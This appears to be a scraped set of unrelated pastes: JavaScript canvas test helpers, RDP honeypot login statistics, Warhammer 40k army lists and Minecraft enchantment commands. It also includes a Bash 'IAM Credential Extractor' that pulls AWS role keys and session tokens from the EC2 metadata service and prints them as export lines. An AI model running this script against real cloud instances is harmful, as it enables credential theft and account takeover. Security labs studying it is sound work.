window.addTryFabricButton = addTryFabricButton;

// Debug function to manually test fabric
window.testFabric = function() {
    console.log(""🧵 Manual fabric test called"");
    renderFabricMockup();
};

// Simple red canvas test
window.testRedCanvas = function() {
    console.log(""🔴 Testing red canvas display"");
    const canvas = document.createElement(""canvas"");
    const ctx = canvas.getContext(""2d"");
    canvas.width = 600;
    canvas.height = 450;
    
    ctx.fillStyle = ""red"";
    ctx.fillRect(0, 0, 600, 450);
    
    ctx.fillStyle = ""white"";
    ctx.font = ""48px Arial"";
    ctx.fillText(""FABRIC TEST"", 150, 250);
    
    const roomMockup = document.getElementById('roomMockup') || dom?.roomMockup;
    if (roomMockup) {
        roomMockup.src = canvas.toDataURL();
        console.log(""🔴 Red canvas set to roomMockup"");
    } else {
        console.error(""❌ No roomMockup element found"");
    }
};

// Simple fabric function that just fits a 3840x2160 image into 600x450
window.simpleFabricTest = function() {
    console.log(""🧵 SIMPLE FABRIC TEST"");
    
    const canvas = document.createElement(""canvas"");
    const ctx = canvas.getContext(""2d"");
    canvas.width = 600;
    canvas.height = 450;
    
    // Fill with a color first
    ctx.fillStyle = ""#F0F0E9"";
    ctx.fillRect(0, 0, 600, 450);
    
    const img = new Image();
    img.crossOrigin = ""anonymous"";
    img.onload = function() {
        console.log(`Image loaded: ${img.width}x${img.height}`);
        
        // Calculate scale to fit 3840x2160 into 600x450
        const scaleX = 600 / img.width;
        const scaleY = 450 / img.height;
        const scale = Math.min(scaleX, scaleY);
        
        console.log(`Scale: ${scale} (${scaleX}, ${scaleY})`);
        
        const w = img.width * scale;
        const h = img.height * scale;
        const x = (600 - w) / 2;
        const y = (450 - h) / 2;
        
        console.log(`Drawing at: ${x}, ${y}, ${w}x${h}`);
        
        ctx.drawImage(img, x, y, w, h);
        
        // Update display
        const roomMockup = document.getElementById('roomMockup');
        if (roomMockup) {
            roomMockup.src = canvas.toDataURL();
            console.log(""✅ Simple fabric test complete"");
        }
    };
    
    img.src = ""https://so-animation.com/colorflex/data/fabric/fabric-base.png"";
};
window.addBackToPatternsButton = addBackToPatternsButton;
window.initializeTryFurnitureFeature = initializeTryFurnitureFeature;"
w5Chw2Va,2025-07-19_stats.json,rdp_snitch,JSON,Saturday 19th of July 2025 07:18:12 PM CDT,"{
  ""ip"": {
    ""68.183.178.139"": 3,
    ""194.165.16.167"": 6,
    ""35.203.210.10"": 12,
    ""194.165.16.162"": 6,
    ""185.196.220.41"": 9,
    ""164.92.192.11"": 1590,
    ""198.235.24.66"": 9,
    ""141.98.11.124"": 12,
    ""2.57.121.247"": 9,
    ""194.180.49.127"": 3,
    ""167.71.183.1"": 9,
    ""198.235.24.219"": 9,
    ""85.215.227.124"": 3,
    ""80.94.95.75"": 15,
    ""162.142.125.117"": 3,
    ""188.166.231.132"": 9,
    ""199.45.155.67"": 3,
    ""191.252.2.116"": 9,
    ""147.185.132.192"": 9,
    ""201.6.156.230"": 3,
    ""181.30.42.98"": 3,
    ""181.15.102.103"": 3,
    ""43.133.180.36"": 3,
    ""205.210.31.46"": 9,
    ""91.238.181.96"": 6
  },
  ""asn"": {
    ""AS14061"": 1611,
    ""AS48721"": 12,
    ""AS396982"": 48,
    ""AS213438"": 9,
    ""AS209605"": 12,
    ""AS47890"": 9,
    ""AS201814"": 3,
    ""AS8560"": 3,
    ""AS204428"": 15,
    ""AS398324"": 3,
    ""AS398722"": 3,
    ""AS27715"": 9,
    ""AS28573"": 3,
    ""AS7303"": 6,
    ""AS132203"": 3,
    ""AS49434"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 1611,
    ""Flyservers S.A."": 12,
    ""Google LLC"": 48,
    ""ColocaTel Inc."": 9,
    ""UAB Host Baltic"": 12,
    ""Unmanaged LTD"": 9,
    ""MEVSPACE sp. z o.o."": 3,
    ""IONOS SE"": 3,
    ""SS-Net"": 15,
    ""Censys, Inc."": 6,
    ""Locaweb Servi\u00e7os de Internet S/A"": 9,
    ""Claro NXT Telecomunicacoes Ltda"": 3,
    ""Telecom Argentina S.A"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Datacenter location PAR1 France"": 6
  },
  ""org"": {
    ""DigitalOcean, LLC"": 1602,
    ""Flyservers S.A"": 12,
    ""Google Cloud (europe-west2)"": 12,
    ""Colocatel Inc"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""Unknown"": 12,
    ""Unmanaged LTD"": 24,
    ""HostSlick"": 3,
    ""Strato AG"": 3,
    ""Censys Inc"": 3,
    ""Digitalocean"": 9,
    ""Censys, Inc."": 3,
    ""Locaweb Servi\u00e7os de Internet S/A"": 9,
    ""Claro NXT Telecomunicacoes Ltda"": 3,
    ""Fibertel"": 3,
    ""Telecom Business"": 3,
    ""Tencent Cloud Computing"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6
  },
  ""regionName"": {
    ""South West"": 12,
    ""Kaunas"": 12,
    ""England"": 21,
    ""Virginia"": 9,
    ""Hesse"": 1590,
    ""California"": 36,
    ""Vilnius"": 12,
    ""Bavaria"": 3,
    ""New Jersey"": 9,
    ""State of Berlin"": 3,
    ""Sofia-Capital"": 15,
    ""Michigan"": 3,
    ""Kowloon"": 3,
    ""S\u00e3o Paulo"": 12,
    ""Buenos Aires"": 3,
    ""Buenos Aires F.D."": 3,
    ""Tokyo"": 3,
    ""\u00cele-de-France"": 6
  },
  ""country"": {
    ""Singapore"": 12,
    ""Lithuania"": 24,
    ""United Kingdom"": 21,
    ""United States"": 57,
    ""Germany"": 1596,
    ""Bulgaria"": 15,
    ""Hong Kong"": 3,
    ""Brazil"": 12,
    ""Argentina"": 6,
    ""Japan"": 3,
    ""France"": 6
  },
  ""account"": {
    ""hello"": 1638,
    ""Test"": 30,
    ""yhDxyQONx"": 6,
    ""nmap"": 3,
    ""naap"": 3,
    ""Domain"": 9,
    ""iLvVGqHYo"": 3,
    ""HhspTe"": 3,
    ""MnmHbU"": 3,
    ""Administr"": 24,
    ""yOcWbrvUP"": 3,
    ""iYOHLf"": 3,
    ""wnxjpX"": 3,
    ""(empty)"": 6,
    ""ujCFkeTyu"": 3,
    ""hHGSBO"": 3,
    ""tIQiBK"": 3,
    ""yHbhNyVFR"": 3,
    ""yTOjbN"": 3,
    ""gubwNo"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1755
  },
  ""client_build"": {
    ""Unknown"": 1755
  },
  ""client_name"": {
    ""Unknown"": 1755
  },
  ""ip_type"": {
    ""hosting & proxy"": 3,
    ""Unknown"": 75,
    ""hosting"": 1677
  }
}"
b9h5QvW7,2025-07-19_stats.json,rdp_snitch,JSON,Saturday 19th of July 2025 07:16:04 PM CDT,"{
  ""ip"": {
    ""68.183.178.139"": 2,
    ""194.165.16.167"": 4,
    ""35.203.210.10"": 8,
    ""194.165.16.162"": 4,
    ""185.196.220.41"": 6,
    ""164.92.192.11"": 1060,
    ""198.235.24.66"": 6,
    ""141.98.11.124"": 8,
    ""2.57.121.247"": 6,
    ""194.180.49.127"": 2,
    ""167.71.183.1"": 6,
    ""198.235.24.219"": 6,
    ""85.215.227.124"": 2,
    ""80.94.95.75"": 10,
    ""162.142.125.117"": 2,
    ""188.166.231.132"": 6,
    ""199.45.155.67"": 2,
    ""191.252.2.116"": 6,
    ""147.185.132.192"": 6,
    ""201.6.156.230"": 2,
    ""181.30.42.98"": 2,
    ""181.15.102.103"": 2,
    ""43.133.180.36"": 2,
    ""205.210.31.46"": 6,
    ""91.238.181.96"": 4
  },
  ""asn"": {
    ""AS14061"": 1074,
    ""AS48721"": 8,
    ""AS396982"": 32,
    ""AS213438"": 6,
    ""AS209605"": 8,
    ""AS47890"": 6,
    ""AS201814"": 2,
    ""AS8560"": 2,
    ""AS204428"": 10,
    ""AS398324"": 2,
    ""AS398722"": 2,
    ""AS27715"": 6,
    ""AS28573"": 2,
    ""AS7303"": 4,
    ""AS132203"": 2,
    ""AS49434"": 4
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 1074,
    ""Flyservers S.A."": 8,
    ""Google LLC"": 32,
    ""ColocaTel Inc."": 6,
    ""UAB Host Baltic"": 8,
    ""Unmanaged LTD"": 6,
    ""MEVSPACE sp. z o.o."": 2,
    ""IONOS SE"": 2,
    ""SS-Net"": 10,
    ""Censys, Inc."": 4,
    ""Locaweb Servi\u00e7os de Internet S/A"": 6,
    ""Claro NXT Telecomunicacoes Ltda"": 2,
    ""Telecom Argentina S.A"": 4,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""Datacenter location PAR1 France"": 4
  },
  ""org"": {
    ""DigitalOcean, LLC"": 1068,
    ""Flyservers S.A"": 8,
    ""Google Cloud (europe-west2)"": 8,
    ""Colocatel Inc"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""Unknown"": 8,
    ""Unmanaged LTD"": 16,
    ""HostSlick"": 2,
    ""Strato AG"": 2,
    ""Censys Inc"": 2,
    ""Digitalocean"": 6,
    ""Censys, Inc."": 2,
    ""Locaweb Servi\u00e7os de Internet S/A"": 6,
    ""Claro NXT Telecomunicacoes Ltda"": 2,
    ""Fibertel"": 2,
    ""Telecom Business"": 2,
    ""Tencent Cloud Computing"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 4
  },
  ""regionName"": {
    ""South West"": 8,
    ""Kaunas"": 8,
    ""England"": 14,
    ""Virginia"": 6,
    ""Hesse"": 1060,
    ""California"": 24,
    ""Vilnius"": 8,
    ""Bavaria"": 2,
    ""New Jersey"": 6,
    ""State of Berlin"": 2,
    ""Sofia-Capital"": 10,
    ""Michigan"": 2,
    ""Kowloon"": 2,
    ""S\u00e3o Paulo"": 8,
    ""Buenos Aires"": 2,
    ""Buenos Aires F.D."": 2,
    ""Tokyo"": 2,
    ""\u00cele-de-France"": 4
  },
  ""country"": {
    ""Singapore"": 8,
    ""Lithuania"": 16,
    ""United Kingdom"": 14,
    ""United States"": 38,
    ""Germany"": 1064,
    ""Bulgaria"": 10,
    ""Hong Kong"": 2,
    ""Brazil"": 8,
    ""Argentina"": 4,
    ""Japan"": 2,
    ""France"": 4
  },
  ""account"": {
    ""hello"": 1092,
    ""Test"": 20,
    ""yhDxyQONx"": 4,
    ""nmap"": 2,
    ""naap"": 2,
    ""Domain"": 6,
    ""iLvVGqHYo"": 2,
    ""HhspTe"": 2,
    ""MnmHbU"": 2,
    ""Administr"": 16,
    ""yOcWbrvUP"": 2,
    ""iYOHLf"": 2,
    ""wnxjpX"": 2,
    ""(empty)"": 4,
    ""ujCFkeTyu"": 2,
    ""hHGSBO"": 2,
    ""tIQiBK"": 2,
    ""yHbhNyVFR"": 2,
    ""yTOjbN"": 2,
    ""gubwNo"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1170
  },
  ""client_build"": {
    ""Unknown"": 1170
  },
  ""client_name"": {
    ""Unknown"": 1170
  },
  ""ip_type"": {
    ""hosting & proxy"": 2,
    ""Unknown"": 50,
    ""hosting"": 1118
  }
}"
KGCPN4e2,2025-07-19_stats.json,rdp_snitch,JSON,Saturday 19th of July 2025 07:15:08 PM CDT,"{
  ""ip"": {
    ""68.183.178.139"": 1,
    ""194.165.16.167"": 2,
    ""35.203.210.10"": 4,
    ""194.165.16.162"": 2,
    ""185.196.220.41"": 3,
    ""164.92.192.11"": 530,
    ""198.235.24.66"": 3,
    ""141.98.11.124"": 4,
    ""2.57.121.247"": 3,
    ""194.180.49.127"": 1,
    ""167.71.183.1"": 3,
    ""198.235.24.219"": 3,
    ""85.215.227.124"": 1,
    ""80.94.95.75"": 5,
    ""162.142.125.117"": 1,
    ""188.166.231.132"": 3,
    ""199.45.155.67"": 1,
    ""191.252.2.116"": 3,
    ""147.185.132.192"": 3,
    ""201.6.156.230"": 1,
    ""181.30.42.98"": 1,
    ""181.15.102.103"": 1,
    ""43.133.180.36"": 1,
    ""205.210.31.46"": 3,
    ""91.238.181.96"": 2
  },
  ""asn"": {
    ""AS14061"": 537,
    ""AS48721"": 4,
    ""AS396982"": 16,
    ""AS213438"": 3,
    ""AS209605"": 4,
    ""AS47890"": 3,
    ""AS201814"": 1,
    ""AS8560"": 1,
    ""AS204428"": 5,
    ""AS398324"": 1,
    ""AS398722"": 1,
    ""AS27715"": 3,
    ""AS28573"": 1,
    ""AS7303"": 2,
    ""AS132203"": 1,
    ""AS49434"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 537,
    ""Flyservers S.A."": 4,
    ""Google LLC"": 16,
    ""ColocaTel Inc."": 3,
    ""UAB Host Baltic"": 4,
    ""Unmanaged LTD"": 3,
    ""MEVSPACE sp. z o.o."": 1,
    ""IONOS SE"": 1,
    ""SS-Net"": 5,
    ""Censys, Inc."": 2,
    ""Locaweb Servi\u00e7os de Internet S/A"": 3,
    ""Claro NXT Telecomunicacoes Ltda"": 1,
    ""Telecom Argentina S.A"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""Datacenter location PAR1 France"": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 534,
    ""Flyservers S.A"": 4,
    ""Google Cloud (europe-west2)"": 4,
    ""Colocatel Inc"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Unknown"": 4,
    ""Unmanaged LTD"": 8,
    ""HostSlick"": 1,
    ""Strato AG"": 1,
    ""Censys Inc"": 1,
    ""Digitalocean"": 3,
    ""Censys, Inc."": 1,
    ""Locaweb Servi\u00e7os de Internet S/A"": 3,
    ""Claro NXT Telecomunicacoes Ltda"": 1,
    ""Fibertel"": 1,
    ""Telecom Business"": 1,
    ""Tencent Cloud Computing"": 1,
    ""ThinkTech Technology Industrial CO. Limited"": 2
  },
  ""regionName"": {
    ""South West"": 4,
    ""Kaunas"": 4,
    ""England"": 7,
    ""Virginia"": 3,
    ""Hesse"": 530,
    ""California"": 12,
    ""Vilnius"": 4,
    ""Bavaria"": 1,
    ""New Jersey"": 3,
    ""State of Berlin"": 1,
    ""Sofia-Capital"": 5,
    ""Michigan"": 1,
    ""Kowloon"": 1,
    ""S\u00e3o Paulo"": 4,
    ""Buenos Aires"": 1,
    ""Buenos Aires F.D."": 1,
    ""Tokyo"": 1,
    ""\u00cele-de-France"": 2
  },
  ""country"": {
    ""Singapore"": 4,
    ""Lithuania"": 8,
    ""United Kingdom"": 7,
    ""United States"": 19,
    ""Germany"": 532,
    ""Bulgaria"": 5,
    ""Hong Kong"": 1,
    ""Brazil"": 4,
    ""Argentina"": 2,
    ""Japan"": 1,
    ""France"": 2
  },
  ""account"": {
    ""hello"": 546,
    ""Test"": 10,
    ""yhDxyQONx"": 2,
    ""nmap"": 1,
    ""naap"": 1,
    ""Domain"": 3,
    ""iLvVGqHYo"": 1,
    ""HhspTe"": 1,
    ""MnmHbU"": 1,
    ""Administr"": 8,
    ""yOcWbrvUP"": 1,
    ""iYOHLf"": 1,
    ""wnxjpX"": 1,
    ""(empty)"": 2,
    ""ujCFkeTyu"": 1,
    ""hHGSBO"": 1,
    ""tIQiBK"": 1,
    ""yHbhNyVFR"": 1,
    ""yTOjbN"": 1,
    ""gubwNo"": 1
  },
  ""keyboard"": {
    ""Unknown"": 585
  },
  ""client_build"": {
    ""Unknown"": 585
  },
  ""client_name"": {
    ""Unknown"": 585
  },
  ""ip_type"": {
    ""hosting & proxy"": 1,
    ""Unknown"": 25,
    ""hosting"": 559
  }
}"
wzGxagXc,Untitled,orenma,Bash,Saturday 19th of July 2025 06:02:10 PM CDT,"#!/bin/bash

# Script to extract IAM role credentials from EC2 metadata service
# For security testing/lab environments only

echo ""==== IAM Credential Extractor (Lab Use Only) ====""
echo """"

# Function to check if metadata service is accessible
check_metadata_access() {
    echo ""[*] Checking metadata service accessibility...""
    
    # Try to reach metadata service
    if timeout 2 curl -s http://169.254.169.254/ > /dev/null 2>&1; then
        echo ""[+] Metadata service is accessible""
        return 0
    else
        echo ""[-] Metadata service is NOT accessible""
        echo ""    This could be because:""
        echo ""    1. Container is blocking access (--add-host redirects)""
        echo ""    2. IMDSv2 is enforced and needs token""
        echo ""    3. Network isolation""
        return 1
    fi
}

# Function to get IMDSv2 token
get_token() {
    echo ""[*] Getting IMDSv2 token...""
    TOKEN=$(curl -s -X PUT ""http://169.254.169.254/latest/api/token"" \
        -H ""X-aws-ec2-metadata-token-ttl-seconds: 21600"" 2>/dev/null)
    
    if [ -z ""$TOKEN"" ]; then
        echo ""[-] Failed to get IMDSv2 token""
        echo ""    Trying IMDSv1 fallback...""
        return 1
    else
        echo ""[+] Got IMDSv2 token: ${TOKEN:0:20}...""
        return 0
    fi
}

# Function to get role name
get_role_name() {
    local use_token=$1
    echo ""[*] Getting IAM role name...""
    
    if [ ""$use_token"" = ""true"" ]; then
        ROLE_NAME=$(curl -s -H ""X-aws-ec2-metadata-token: $TOKEN"" \
            http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
    else
        # IMDSv1 fallback
        ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
    fi
    
    if [ -z ""$ROLE_NAME"" ]; then
        echo ""[-] No IAM role found attached to instance""
        return 1
    else
        echo ""[+] Found IAM role: $ROLE_NAME""
        return 0
    fi
}

# Function to get credentials
get_credentials() {
    local use_token=$1
    echo ""[*] Getting IAM credentials for role: $ROLE_NAME""
    
    if [ ""$use_token"" = ""true"" ]; then
        CREDS=$(curl -s -H ""X-aws-ec2-metadata-token: $TOKEN"" \
            http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null)
    else
        # IMDSv1 fallback
        CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null)
    fi
    
    if [ -z ""$CREDS"" ] || [[ ""$CREDS"" == *""404""* ]]; then
        echo ""[-] Failed to get credentials""
        return 1
    else
        echo ""[+] Successfully retrieved credentials!""
        echo """"
        echo ""==== IAM Credentials ====""
        echo ""$CREDS"" | jq . 2>/dev/null || echo ""$CREDS""
        return 0
    fi
}

# Function to export credentials as environment variables
export_credentials() {
    if [ -n ""$CREDS"" ]; then
        echo """"
        echo ""[*] Exporting credentials as environment variables...""
        
        # Parse credentials
        ACCESS_KEY=$(echo ""$CREDS"" | jq -r '.AccessKeyId' 2>/dev/null || echo ""$CREDS"" | grep -oP '""AccessKeyId""\s*:\s*""\K[^""]+')
        SECRET_KEY=$(echo ""$CREDS"" | jq -r '.SecretAccessKey' 2>/dev/null || echo ""$CREDS"" | grep -oP '""SecretAccessKey""\s*:\s*""\K[^""]+')
        SESSION_TOKEN=$(echo ""$CREDS"" | jq -r '.Token' 2>/dev/null || echo ""$CREDS"" | grep -oP '""Token""\s*:\s*""\K[^""]+')
        
        if [ -n ""$ACCESS_KEY"" ] && [ -n ""$SECRET_KEY"" ] && [ -n ""$SESSION_TOKEN"" ]; then
            echo """"
            echo ""# Add these to your environment:""
            echo ""export AWS_ACCESS_KEY_ID=\""$ACCESS_KEY\""""
            echo ""export AWS_SECRET_ACCESS_KEY=\""$SECRET_KEY\""""
            echo ""export AWS_SESSION_TOKEN=\""$SESSION_TOKEN\""""
            echo """"
            echo ""[+] You can now use AWS CLI with these credentials!""
        fi
    fi
}

# Main execution
main() {
    # Check metadata access
    if ! check_metadata_access; then
        echo """"
        echo ""==== Troubleshooting ====""
        echo ""If running in Docker, make sure you DON'T have these flags:""
        echo ""  --add-host=169.254.169.254:127.0.0.1""
        echo ""  --add-host=metadata.ec2.internal:127.0.0.1""
        echo """"
        echo ""These redirect metadata service to localhost!""
        exit 1
    fi
    
    # Try IMDSv2 first
    if get_token; then
        if get_role_name ""true"" && get_credentials ""true""; then
            export_credentials
        fi
    else
        # Fallback to IMDSv1
        echo ""[*] Falling back to IMDSv1...""
        if get_role_name ""false"" && get_credentials ""false""; then
            export_credentials
        fi
    fi
}

# Run main function
main "
rLqEBx1X,Custodes R3,TableTopLive,PHP,Saturday 19th of July 2025 04:22:21 PM CDT,"Historicon (2000 Points)

Adeptus Custodes
Lions of the Emperor
Strike Force (2,000 Points)

CHARACTERS

Blade Champion (145 Points)
• 1x Vaultswords
• Enhancements: Superior Creation

Blade Champion (120 Points)
• 1x Vaultswords

Shield-Captain (140 Points)
• Warlord
• 1x Castellan axe
• Enhancements: Admonimortis

BATTLELINE

Custodian Guard (215 Points)
• 5x Custodian Guard
◦ 5x Guardian spear

Custodian Guard (215 Points)
• 5x Custodian Guard
◦ 5x Guardian spear

OTHER DATASHEETS

Allarus Custodians (180 Points)
• 3x Allarus Custodian
◦ 3x Balistus grenade launcher
◦ 3x Guardian spear

Caladius Grav-tank (215 Points)
• 1x Armoured hull
• 1x Twin arachnus heavy blaze cannon
• 1x Twin lastrum bolt cannon

Custodian Wardens (260 Points)
• 5x Custodian Warden
◦ 5x Guardian spear
◦ 1x Vexilla

Custodian Wardens (260 Points)
• 5x Custodian Warden
◦ 5x Guardian spear
◦ 1x Vexilla

Prosecutors (40 Points)
• 1x Prosecutor Sister Superior
◦ 1x Boltgun
◦ 1x Close combat weapon
• 3x Prosecutor
◦ 3x Boltgun
◦ 3x Close combat weapon

Vigilators (50 Points)
• 1x Vigilator Sister Superior
◦ 1x Executioner greatblade
• 3x Vigilator
◦ 3x Executioner greatblade

Witchseekers (65 Points)
• 1x Witchseeker Sister Superior
◦ 1x Close combat weapon
◦ 1x Witchseeker flamer
• 4x Witchseeker
◦ 4x Close combat weapon
◦ 4x Witchseeker flamer

ALLIED UNITS

Inquisitor Draxus (95 Points)
• 1x Dirgesinger
• 1x Power fist
• 1x Psychic Tempest"
DwpqGm41,Sisters R3,TableTopLive,PHP,Saturday 19th of July 2025 04:21:58 PM CDT,"Live by the 4++, Die by the 4++ (2000 Points)

Adepta Sororitas
Champions of Faith
Strike Force (2,000 Points)

CHARACTERS

Hospitaller (50 Points)
• 1x Bolt pistol
• 1x Chirurgeon’s tools

Hospitaller (50 Points)
• 1x Bolt pistol
• 1x Chirurgeon’s tools

Hospitaller (50 Points)
• 1x Bolt pistol
• 1x Chirurgeon’s tools

Junith Eruita (80 Points)
• 1x Mace of Castigation
• 1x Twin Ministorum heavy flamer

Morvenn Vahl (170 Points)
• Warlord
• 1x Fidelis
• 1x Lance of Illumination
• 1x Paragon missile launcher

DEDICATED TRANSPORTS

Immolator (115 Points)
• 1x Armoured tracks
• 1x Heavy bolter
• 1x Hunter-killer missile
• 1x Twin multi-melta

Immolator (115 Points)
• 1x Armoured tracks
• 1x Heavy bolter
• 1x Hunter-killer missile
• 1x Twin multi-melta

Sororitas Rhino (75 Points)
• 1x Armoured tracks
• 1x Hunter-killer missile
• 1x Storm bolter

OTHER DATASHEETS

Castigator (160 Points)
• 1x Armoured tracks
• 1x Castigator autocannons
• 3x Heavy bolter
• 1x Hunter-killer missile
• 1x Storm bolter

Castigator (160 Points)
• 1x Armoured tracks
• 1x Castigator autocannons
• 3x Heavy bolter
• 1x Hunter-killer missile
• 1x Storm bolter

Castigator (160 Points)
• 1x Armoured tracks
• 1x Castigator autocannons
• 3x Heavy bolter
• 1x Hunter-killer missile
• 1x Storm bolter

Celestian Sacresants (130 Points)
• 1x Sacresant Superior
◦ 1x Inferno pistol
◦ 1x Spear of the faithful
• 9x Celestian Sacresant
◦ 9x Bolt pistol
◦ 9x Hallowed mace

Celestian Sacresants (130 Points)
• 1x Sacresant Superior
◦ 1x Inferno pistol
◦ 1x Spear of the faithful
• 9x Celestian Sacresant
◦ 9x Bolt pistol
◦ 9x Hallowed mace

Celestian Sacresants (130 Points)
• 1x Sacresant Superior
◦ 1x Inferno pistol
◦ 1x Spear of the faithful
• 9x Celestian Sacresant
◦ 9x Bolt pistol
◦ 9x Hallowed mace

Dominion Squad (115 Points)
• 1x Dominion Superior
◦ 1x Bolt pistol
◦ 1x Close combat weapon
◦ 1x Combi-weapon
◦ 1x Power weapon
• 9x Dominion
◦ 9x Bolt pistol
◦ 5x Boltgun
◦ 9x Close combat weapon
◦ 4x Meltagun
◦ 1x Simulacrum Imperialis

Paragon Warsuits (210 Points)
• 1x Paragon Superior
◦ 1x Bolt pistol
◦ 1x Multi-melta
◦ 1x Paragon grenade launchers
◦ 1x Paragon war blade
• 2x Paragon
◦ 2x Bolt pistol
◦ 2x Multi-melta
◦ 2x Paragon grenade launchers
◦ 2x Paragon war blade

Sisters Novitiate Squad (100 Points)
• 1x Novitiate Superior
◦ 1x Close combat weapon
◦ 1x Plasma pistol
◦ 1x Power weapon
• 9x Sister Novitiate
◦ 9x Autopistol
◦ 4x Close combat weapon
◦ 2x Ministorum flamer
◦ 5x Novitiate melee weapons
◦ 1x Sacred Banner
◦ 1x Simulacrum Imperialis
"
ez8mTq0m,Minecraft 1.21.8 - Custom enchantment commands,Unimatrix36,Lua,Saturday 19th of July 2025 03:06:41 PM CDT,".

These commands work on Java Minecraft 1.21.6 - 1.21.7 - 1.21.8
They don't work on console/bedrock or ""whatever"" version.


If you run a Spigot or CraftBukkit server with the Essentials plugin installed you need to add ""minecraft:"" in front of the command.
If you run a regular vanilla Spigot, CraftBukkit or ""Mojang"" server without Essentials you don't need to add ""minecraft:""
You don't need / in front of the command if you put the command in a command block.
Example for Spigot or CraftBukkit servers with the Essentials plugin:

minecraft:give @p diamond_sword
 
minecraft:xp add @p -36 levels


Let's continue with the commands.


Night Vision 1 Hour
/give @a potion[potion_contents={custom_color:8439583,custom_effects:[{id:night_vision,duration:72000,show_particles:0b}]}]

/give @p potion[potion_contents={custom_color:8439583,custom_effects:[{duration:72000}]},custom_name='["""",{""text"":""Potion of Night Vision"",""italic"":false}]'] 1


Netherite Helmet
Name - Level
Protection 4, Respiration 3, Aqua Affinity 1, Unbreaking 3, Mending 1
give @p netherite_helmet[enchantments={protection:4,respiration:3,aqua_affinity:1,unbreaking:3,mending:1}]


Netherite Chestplate
Name - Level
Fire protection 4, Thorns 3, Unbreaking 3, Mending 1
give @p netherite_chestplate[enchantments={fire_protection:4,thorns:3,unbreaking:3,mending:1}]


Netherite Leggings
Name - Level
Blast Protection 4, Unbreaking 3, Mending 1
give @p netherite_leggings[enchantments={blast_protection:4,unbreaking:3,mending:1}]


Netherite Boots
Name - Level
Feather Falling 4, Projectile Protection 4, Depth Strider 3, Unbreaking 3, Mending 1
give @p netherite_boots[enchantments={feather_falling:4,projectile_protection:4,depth_strider:3,unbreaking:3,mending:1}]



Sword: Mobs (Catch me outside)
Name - Level
Smite 5, Knockback 1, Fire Aspect 2, Looting 3, Sweeping Edge 3, Unbreaking 3, Mending 1
give @p netherite_sword[custom_name='Catch me outside',enchantments={smite:5,knockback:1,fire_aspect:2,looting:3,sweeping_edge:3,unbreaking:3,mending:1}]


Sword: Endermen
Name - Level
Sharpness 5, Looting 3, Sweeping Edge 3, Unbreaking 3, Mending 1
give @p netherite_sword[custom_name='Endermen',enchantments={sharpness:5,looting:3,sweeping_edge:3,unbreaking:3,mending:1}]


Sword: Animals
Name - Level
Sharpness 5, Fire Aspect 2, Looting 3, Sweeping Edge 3, Unbreaking 3, Mending 1
give @p netherite_sword[custom_name='Animals',enchantments={sharpness:5,fire_aspect:2,looting:3,sweeping_edge:3,unbreaking:3,mending:1}]


Bow: Bow Wow
Name - Level
Flame 1, Infinity 1, Power 5, Punch 2, Unbreaking 3, Mending 1
give @p bow[custom_name='Bow Wow',enchantments={flame:1,infinity:1,power:5,punch:2,unbreaking:3,mending:1}]

Give 64 arrows
give @p arrow 1


Fishing Rod: The Fishy Rod
Name - Level
Luck of the Sea 3, Lure 3, Unbreaking 3, Mending 1
give @p fishing_rod[custom_name='The Fishy Rod',enchantments={luck_of_the_sea:3,lure:3,unbreaking:3,mending:1}]


Pickaxe: Fortune 3
Name - Level
Efficiency 5, Fortune 3, Unbreaking 3, Mending 1
give @p netherite_pickaxe[custom_name='Fortune',enchantments={efficiency:5,fortune:3,unbreaking:3,mending:1}]


Pickaxe: Fortune 64
Name - Level
Efficiency 5, Fortune 64, Unbreaking 3, Mending 1
give @p netherite_pickaxe[custom_name='Fortune 64',enchantments={efficiency:5,fortune:64,unbreaking:3,mending:1}]


Pickaxe: Efficiency 8 Unbreaking 10 Fortune 10
Name - Level
Efficiency 8, Fortune 10, Unbreaking 10, Mending 1
give @p netherite_pickaxe[custom_name='Suppa Duppa',enchantments={efficiency:8,fortune:10,unbreaking:10,mending:1}]

give @p netherite_pickaxe[enchantments={efficiency:8,fortune:10,unbreaking:10,mending:1}]


Pickaxe: Silk Touch
Name - Level
Efficiency 5, Silk Touch 1, Unbreaking 3, Mending 1
give @p netherite_pickaxe[custom_name='Silk Touch',enchantments={efficiency:5,silk_touch:1,unbreaking:3,mending:1}]


Axe: The Choppa
Name - Level
Efficiency 5, Fortune 3, Unbreaking 3, Mending 1
give @p netherite_axe[custom_name='The Choppa',enchantments={efficiency:5,fortune:3,unbreaking:3,mending:1}]


Shovel: Pooper Scooper
Name - Level
Efficiency 5, Silk Touch 1, Unbreaking 3, Mending 1
give @p netherite_shovel[custom_name='Pooper Scooper',enchantments={efficiency:5,silk_touch:1,unbreaking:3,mending:1}]


Elytra: Bird is the Word
Name - Level
Unbreaking 3, Mending 1
give @p elytra[custom_name='Bird is the Word',enchantments={unbreaking:3,mending:1}]


Give 64 Fireworks
give @p firework_rocket[fireworks={flight_duration:3,explosions:[{shape:small_ball}]}] 64


Trident: Aquatic
Name - Level
Loyalty 3, Impaling 5, Unbreaking 3, Mending 1
give @p trident[custom_name='Trident Aquatic',enchantments={loyalty:3,impaling:5,unbreaking:3,mending:1}]


Trident: Aquatic Riptide
Name - Level
Loyalty 3, Impaling 5, Riptide 3, Unbreaking 3, Mending 1
give @p trident[custom_name='Trident Aquatic Riptide',enchantments={loyalty:3,impaling:5,riptide:3,unbreaking:3,mending:1}]


."
